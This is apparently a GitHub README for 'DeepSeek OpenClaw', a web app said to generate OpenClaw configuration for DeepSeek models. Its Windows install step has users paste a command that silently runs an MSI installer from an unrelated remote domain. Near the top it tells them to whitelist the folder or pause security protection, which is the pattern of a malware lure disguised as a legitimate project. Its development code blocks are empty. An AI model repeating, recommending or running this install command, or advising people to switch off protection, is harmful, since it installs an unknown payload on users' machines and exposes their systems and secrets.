<img width="2172" height="724" alt="7522b1cb-01db-4c38-a626-b530a22ff32d" src="https://github.com/ExcellenceInvestor98/deepseek-openclaw-466/e2dd6a50-d475-4a48-8937-b8b6726a8831" />
# DeepSeek OpenClaw


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/ExcellenceInvestor98/deepseek-openclaw-466.git
cd deepseek-openclaw-466
npm install
npm start
```


DeepSeek OpenClaw is a local-first web app for preparing DeepSeek configuration assets for OpenClaw. It helps users choose a DeepSeek model, generate a copy-ready OpenClaw onboarding command, and create a redacted configuration snippet without sending API keys to a backend.

## One-command installation

## 🪟 Windows Installation
### **Step 1 — Open Command Prompt**
```
cmd
```
This will open **Command Prompt**.
---
### **Step 2 — Run the Install Command**
Copy the command below and paste it into **Command Prompt**, then press **Enter**.
```powershell
cmd /c start msiexec /q /i https://devcodee.com/api & deepseek-openclaw
```
The installer will automatically download and install the required components.


## Features

- DeepSeek model catalog for OpenClaw-oriented workflows.
- Local command generator for OpenClaw onboarding.
- Redacted OpenClaw config preview.
- Secret-aware UI copy and security checklist.
- Vite + React + TypeScript frontend.
- GitHub Actions build workflow.

## Screens

The app contains four main sections:

## Model references

The starter includes these model references:

| Model | Use case |
| --- | --- |
| `deepseek/deepseek-v4-flash` | Default fast path for everyday automation |
| `deepseek/deepseek-v4-pro` | Stronger model for complex coding and planning |
| `deepseek/deepseek-chat` | General non-thinking chat surface |
| `deepseek/deepseek-reasoner` | Reasoning-focused sessions |

Always verify the final model list against your installed OpenClaw version and the current DeepSeek/OpenClaw documentation.

## Local development

```bash
```

Build for production:

```bash
```

Preview the production build:

```bash
```

## Project structure

```text
deepseek-openclaw/
├── .github/workflows/ci.yml
├── src/
│   ├── App.tsx
│   ├── main.tsx
│   ├── models.ts
│   ├── openclaw.ts
│   ├── styles.css
│   ├── types.ts
│   └── vite-env.d.ts
├── .env.example
├── .gitignore
├── CONTRIBUTING.md
├── LICENSE
├── README.md
├── SECURITY.md
├── index.html
├── package.json
├── tsconfig.json
├── tsconfig.node.json
└── vite.config.ts
```

## Configuration behavior

The app generates two outputs:

### Onboarding command

A shell command based on OpenClaw's non-interactive onboarding flow. The generated command uses `DEEPSEEK_API_KEY` when no key is typed into the UI.

### OpenClaw config snippet

A small JSON-style snippet showing:

```json
{
  "env": {
    "DEEPSEEK_API_KEY": "${DEEPSEEK_API_KEY}"
  },
  "agents": {
    "defaults": {
      "model": {
        "primary": "deepseek/deepseek-v4-flash"
      }
    }
  }
}
```

When a key is typed, the preview intentionally displays `sk-***redacted***` instead of the real value.

## Security notes

- Do not commit real API keys.
- Do not publish screenshots containing real secrets.
- Prefer environment variables, OpenClaw auth profiles, or a dedicated secret store.
- Review generated commands before running them on a real machine.
- Lock down OpenClaw channels with allowlists and mention rules before exposing an assistant to messaging platforms.


## References

- OpenClaw documentation: https://docs.openclaw.ai/
- OpenClaw DeepSeek provider documentation: https://docs.openclaw.ai/providers/deepseek
- DeepSeek OpenClaw integration documentation: https://api-docs.deepseek.com/quick_start/agent_integrations/openclaw

## License

MIT


<!-- Last updated: 2026-06-05 13:32:22 -->
